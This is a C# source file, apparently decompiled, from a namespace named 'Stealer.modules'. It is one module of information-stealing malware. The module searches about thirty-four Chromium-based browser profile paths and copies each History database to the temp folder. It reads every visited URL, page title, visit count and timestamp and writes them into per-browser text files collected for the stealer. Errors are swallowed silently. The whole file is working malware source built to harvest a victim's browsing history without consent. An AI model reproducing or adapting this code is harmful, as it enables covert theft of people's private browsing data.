using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.modules
{
	// Token: 0x02000027 RID: 39
	internal class History
	{
		// Token: 0x060000C4 RID: 196 RVA: 0x0000968C File Offset: 0x0000788C
		public static void GetHistory()
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
			string str3 = "\\User Data\\Default\\History";
			string[] array = new string[]
			{
				str2 + "Google\\Chrome" + str3,
				str2 + "Google(x86)\\Chrome" + str3,
				str2 + "Chromium" + str3,
				str2 + "Microsoft\\Edge" + str3,
				str + "Opera Software\\Opera Stable\\History",
				str2 + "BraveSoftware\\Brave-Browser" + str3,
				str2 + "Epic Privacy Browser" + str3,
				str2 + "Vivaldi" + str3,
				str2 + "Orbitum" + str3,
				str2 + "Mail.Ru\\Atom" + str3,
				str2 + "CentBrowser" + str3,
				str2 + "Kometa" + str3,
				str2 + "Amigo" + str3,
				str2 + "Rockmelt" + str3,
				str2 + "Comodo\\Dragon" + str3,
				str2 + "Torch" + str3,
				str2 + "Comodo" + str3,
				str2 + "Slimjet" + str3,
				str2 + "Flock" + str3,
				str2 + "AcWebBrowser" + str3,
				str2 + "Black Hawk" + str3,
				str2 + "Maple Studio" + str3,
				str2 + "CoolNovo" + str3,
				str2 + "Titan Browser" + str3,
				str2 + "Baidu Spark" + str3,
				str2 + "360Browser\\Browser" + str3,
				str2 + "Maxthon" + str3,
				str2 + "K-Melon" + str3,
				str2 + "Sputnik\\Sputnik" + str3,
				str2 + "Nichrome" + str3,
				str2 + "CocCoc\\Browser" + str3,
				str2 + "uCozMedia\\Uran" + str3,
				str2 + "Chromodo" + str3,
				str2 + "Yandex\\YandexBrowser" + str3
			};
			List<string[]> list = new List<string[]>();
			try
			{
				foreach (string text in array)
				{
					if (File.Exists(text))
					{
						string text2 = "";
						foreach (string text3 in Help.BrowsersName)
						{
							if (text.Contains(text3))
							{
								text2 = text3;
							}
						}
						string text4 = Environment.GetEnvironmentVariable("temp") + "\\browserHistory";
						if (File.Exists(text4))
						{
							File.Delete(text4);
						}
						File.Copy(text, text4);
						cSQLite cSQLite = new cSQLite(text4);
						cSQLite.ReadTable("urls");
						for (int k = 0; k < cSQLite.GetRowCount(); k++)
						{
							string[] item = new string[]
							{
								Convert.ToString(cSQLite.GetValue(k, 1)),
								Crypt.toUTF8(Convert.ToString(cSQLite.GetValue(k, 2))),
								Convert.ToString(Convert.ToInt32(cSQLite.GetValue(k, 3)) + 1),
								Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10L * Convert.ToInt64(cSQLite.GetValue(k, 5))), TimeZoneInfo.Local)),
								text2
							};
							list.Add(item);
						}
					}
				}
			}
			catch
			{
			}
			string str4 = Program.path + "\\";
			foreach (string[] array3 in list)
			{
				Directory.CreateDirectory(str4 + array3[4]);
				using (StreamWriter streamWriter = new StreamWriter(str4 + array3[4] + "\\History.txt", true))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						"\n[HISTORY]\nUrl: ",
						array3[0],
						"\nTitle: ",
						array3[1],
						"\nVisits: ",
						array3[2],
						"\nDate: ",
						array3[3]
					}));
				}
			}
		}
	}
}
